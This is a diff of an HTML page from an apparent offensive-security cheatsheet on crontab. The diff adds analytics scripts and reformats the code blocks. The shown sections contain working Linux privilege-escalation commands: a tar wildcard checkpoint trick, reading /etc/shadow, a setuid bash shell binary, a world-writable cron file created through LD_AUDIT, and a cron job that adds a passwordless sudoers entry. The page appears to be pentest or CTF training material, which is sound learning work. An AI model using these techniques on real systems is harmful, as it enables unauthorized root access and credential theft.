@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2022-09-11T16:52:52 CEST">
+<meta name="revised" content="2023-02-14T12:07:00 CET">
 <title>Crontab :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -27,7 +27,36 @@
     
       <header>
   <div class="logo">
-    <a class="baselink" href="/">Offensive Security Cheatsheet</a>
+    <head>
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'G-Q5C993721K', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'G-Q5C993721K', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+</head>
+<a class="baselink" href="/">Offensive Security Cheatsheet</a>
+
   </div>
   <div class="burger"><a href="javascript:void(0);" style="font-size:15px;">&#9776;</a></div>
     <nav class="shortcuts">
@@ -1819,9 +1848,7 @@
     
     
     
-    
-
-<h3 id="tar-wildcard-root-cron">Tar wildcard + root cron</h3>
+    <h3 id="tar-wildcard--root-cron">Tar wildcard + root cron</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># If a privilegied script is used to backup something or just uses tar * in a folder you have write access</span>
 <span style="color:#75715e"># You can exploit it to gain root access</span>
 
@@ -1831,9 +1858,8 @@ touch -- “--checkpoint-action<span style="color:#f92672">=</span><span style="
 touch shell.sh
 
 <span style="color:#75715e"># Then put your payload in the shell.sh script (#!/bin/sh)</span>
-cat /etc/shadow &gt; outfile.txt</code></pre></div>
-<p><br/></p>
-
+cat /etc/shadow &gt; outfile.txt
+</code></pre></div><!-- raw HTML omitted -->
 <h3 id="exploiting-crontab">Exploiting crontab</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># If a script is running with higher privileges</span>
 <span style="color:#111">echo</span> <span style="color:#d88200">&#34;cat /challenge/app-script/ch4/.passwd &gt;/tmp/cracked&#34;</span> &gt; cron.d/go <span style="color:#f92672">&amp;&amp;</span> chmod a+x cron.d/go <span style="color:#f92672">&amp;&amp;</span> sleep <span style="color:#ae81ff">60</span> <span style="color:#f92672">&amp;&amp;</span> cat /tmp/cracked
@@ -1846,20 +1872,19 @@ cat /etc/passwd <span style="color:#111">|</span> grep shell4cracked
 <span style="color:#75715e">#include &lt;unistd.h&gt;</span>
 
 int main<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
-    setresuid<span style="color:#f92672">(</span><span style="color:#ae81ff">1028</span>, <span style="color:#ae81ff">1028</span>, <span style="color:#ae81ff">1028</span><span style="color:#f92672">)</span><span style="color:#111">;</span>
-    setresuid<span style="color:#f92672">(</span><span style="color:#ae81ff">1028</span>, <span style="color:#ae81ff">1028</span>, <span style="color:#ae81ff">1028</span><span style="color:#f92672">)</span><span style="color:#111">;</span>  
+    setresuid<span style="color:#f92672">(</span>1028, 1028, 1028<span style="color:#f92672">)</span><span style="color:#111">;</span>
+    setresuid<span style="color:#f92672">(</span>1028, 1028, 1028<span style="color:#f92672">)</span><span style="color:#111">;</span>  
     system<span style="color:#f92672">(</span><span style="color:#d88200">&#34;/bin/bash&#34;</span><span style="color:#f92672">)</span><span style="color:#111">;</span>
-    <span style="color:#00a8c8">return</span> <span style="color:#ae81ff">0</span><span style="color:#111">;</span>
+    <span style="color:#00a8c8">return</span> 0<span style="color:#111">;</span>
 <span style="color:#f92672">}</span>
 
 <span style="color:#75715e"># Compile and prepare</span>
 gcc -o /tmp/pwned /tmp/._cron/shell.c
 chmod +s /tmp/pwned   
-chmod a+rwx /tmp/pwned</code></pre></div>
-<p><br/></p>
-
+chmod a+rwx /tmp/pwned
+</code></pre></div><!-- raw HTML omitted -->
 <h3 id="writable-cron-directory">Writable CRON directory</h3>
-<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># In /tmp</span> 
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># In /tmp </span>
 <span style="color:#75715e"># LD_AUDIT=&#34;libpcprofile.so&#34; PCPROFILE_OUTPUT=&#34;/etc/cron.d/exploit&#34; ping</span>
 <span style="color:#75715e"># since it won&#39;t find the .so, the file from PCPROFILE_OUTPUT will be written as word writeable</span>
 <span style="color:#75715e"># Then insert payload inside to create suid root program in /tmp</span>
@@ -1867,13 +1892,14 @@ chmod a+rwx /tmp/pwned</code></pre></div>
 cat /etc/cron.d/exploit
 ll
 ./exploit
-whoami</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># New crontab</span>
+whoami
+</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># New crontab</span>
 touch /tmp/test
 /usr/local/share/sgml/donpcgd /tmp/test /etc/cron.hourly/test
 <span style="color:#111">echo</span> -e <span style="color:#d88200">&#39;#!/bin/bash\necho &#34;eric ALL=(ALL) NOPASSWORD:ALL&#34; &gt;&gt; /etc/sudoers&#39;</span> &gt; /etc/cron.hourly/test
 chmod +x /etc/cron.hourly/test
-cat /etc/chron.hourly/test</code></pre></div>
-<p><br/></p>
+cat /etc/chron.hourly/test
+</code></pre></div><!-- raw HTML omitted -->
 
 
     
